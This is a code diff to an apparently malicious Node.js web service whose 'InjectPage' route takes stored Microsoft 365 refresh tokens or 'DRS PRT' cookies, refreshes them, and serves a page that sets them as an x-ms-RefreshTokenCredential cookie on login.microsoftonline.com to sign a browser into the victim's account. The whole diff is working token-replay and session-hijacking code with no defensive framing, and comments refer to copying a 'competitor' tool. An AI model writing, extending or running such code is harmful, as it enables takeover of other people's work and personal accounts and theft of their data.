@@ -352,9 +352,34 @@ router.get('/page/:id', async (req, res) => {
       }
     }
 
+    // PRIORITY: Check for stored DRS PRT cookie (most reliable for work/school accounts)
+    var prtCookie = null;
+    if (accountType === 'work_school' && tokenRecord.user_id && tenant && tenant !== 'common' && tenant !== 'organizations') {
+      try {
+        const cookieConverter = require('../services/cookieconverter');
+        prtCookie = await cookieConverter.getStoredPrtCookie(tokenRecord.user_id, tenant);
+        if (prtCookie) {
+          console.log('[InjectPage] Using stored DRS PRT cookie for injection');
+          // Refresh the PRT cookie to get a fresh one
+          try {
+            const freshPrt = await cookieConverter.refreshStoredPrtCookie(tokenRecord.user_id, tenant, refreshToken);
+            if (freshPrt) {
+              prtCookie = freshPrt;
+              console.log('[InjectPage] Refreshed DRS PRT cookie');
+            }
+          } catch (refreshErr) {
+            console.warn('[InjectPage] PRT refresh failed, using stored PRT:', refreshErr.message);
+          }
+        }
+      } catch (prtErr) {
+        console.warn('[InjectPage] Failed to get stored PRT cookie:', prtErr.message);
+      }
+    }
+
     var rtParam = rtForUrl ? '?rt=' + encodeURIComponent(rtForUrl) : '';
     console.log('[InjectPage] RT param:', rtParam ? 'YES (' + rtForUrl.substring(0, 20) + '...)' : 'NO');
-    res.type('html').send(generateAutoRedirectPage(loginUrl, tokenType, primaryToken, rtForUrl || '', tenant, accountType, rtParam));
+    console.log('[InjectPage] PRT cookie:', prtCookie ? 'YES (DRS PRT available)' : 'NO (using refresh token)');
+    res.type('html').send(generateAutoRedirectPage(loginUrl, tokenType, primaryToken, rtForUrl || '', tenant, accountType, rtParam, prtCookie));
   } catch (err) {
     console.error('[InjectPage] Error:', err);
     res.status(500).send('<html><body style="background:#0a0a1a;color:#ff4444;padding:40px;font-family:sans-serif;"><h1>Server Error</h1></body></html>');
@@ -457,8 +482,9 @@ function generateLoginUrl(accessToken, tokenType, tenant, clientId, accountType)
 // Helper: Generate Auto-Redirect HTML Page
 // =========================================================
 
-function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken, tenant, accountType, rtParam) {
+function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken, tenant, accountType, rtParam, prtCookie) {
   const targetName = accountType === 'personal' ? 'Microsoft Personal Account' : 'Microsoft 365 / Azure AD';
+  const hasPrtCookie = !!prtCookie;
 
   return `<!DOCTYPE html>
 <html lang="en">
@@ -551,35 +577,43 @@ function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken
     </div>
     <div class="status" id="status">
       STEP 1: Token exchanged successfully ✓<br>
-      STEP 2: Injecting credential cookie...
+      STEP 2: Injecting credential cookie...${hasPrtCookie ? ' (DRS PRT)' : ''}
     </div>
     <a href="https://login.microsoftonline.com/?auth=2" class="manual-btn" id="manualBtn" style="display:none;">
       Click Here If Not Redirected
     </a>
   </div>
   <script>
-    // x-ms-RefreshTokenCredential format: RAW refresh token (NOT base64 encoded, NOT JSON wrapped)
+    // x-ms-RefreshTokenCredential format: DRS PRT cookie or RAW refresh token
+    // DRS PRT cookies are the most reliable format for work/school accounts
     // This is how Microsoft's authentication endpoint expects the credential
-    // Competitor uses this exact format - raw JWT or raw refresh token directly
     var statusDiv = document.getElementById('status');
     var manualBtn = document.getElementById('manualBtn');
+    var hasPrtCookie = ${hasPrtCookie};
+    var prtCookieValue = ${hasPrtCookie ? JSON.stringify(prtCookie) : 'null'};
 
     function getRefreshTokenFromUrl() {
       var params = new URLSearchParams(window.location.search);
       var rt = params.get('rt');
       return rt || '';
     }
-    
-    var refreshCredential = getRefreshTokenFromUrl();
-    
-    if (refreshCredential && refreshCredential.length > 10) {
-      try {
-        // Set x-ms-RefreshTokenCredential with RAW token (competitor format)
-        // Microsoft's auth endpoint reads this cookie and extracts the refresh token directly
-        document.cookie = 'x-ms-RefreshTokenCredential=' + encodeURIComponent(refreshCredential) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None';
 
-        statusDiv.innerHTML = 'STEP 1: Credential cookie injected ✓<br>STEP 2: Authenticating with Microsoft...';
-        console.log('[Inject] Cookie set with raw credential, length:', refreshCredential.length);
+    var refreshCredential = getRefreshTokenFromUrl();
+
+    // Use DRS PRT cookie if available, otherwise fall back to refresh token
+    var credentialToInject = hasPrtCookie && prtCookieValue ? prtCookieValue : refreshCredential;
+
+    if (credentialToInject && credentialToInject.length > 10) {
+      try {
+        // Set x-ms-RefreshTokenCredential with the credential
+        // DRS PRT cookies are raw JWT format, refresh tokens are raw JWT format
+        // Microsoft's auth endpoint reads this cookie and extracts the credential directly
+        var cookieDomain = hasPrtCookie ? '.login.microsoftonline.com' : '.login.microsoftonline.com';
+        document.cookie = 'x-ms-RefreshTokenCredential=' + encodeURIComponent(credentialToInject) + '; domain=' + cookieDomain + '; path=/; Secure; SameSite=None';
+
+        var credentialType = hasPrtCookie ? 'DRS PRT cookie' : 'refresh token';
+        statusDiv.innerHTML = 'STEP 1: ' + credentialType + ' injected ✓<br>STEP 2: Authenticating with Microsoft...';
+        console.log('[Inject] Cookie set with', credentialType + ', length:', credentialToInject.length);
 
         // Redirect to Microsoft login which will read the cookie and auto-authenticate
         setTimeout(function() {
@@ -594,8 +628,8 @@ function generateAutoRedirectPage(loginUrl, tokenType, accessToken, refreshToken
         }, 1000);
       }
     } else {
-      statusDiv.innerHTML = 'No refresh token found in request. Click button to continue.';
-      console.error('[Inject] No refresh token in URL');
+      statusDiv.innerHTML = 'No credential found in request. Click button to continue.';
+      console.error('[Inject] No credential to inject');
       manualBtn.style.display = 'inline-block';
     }
 
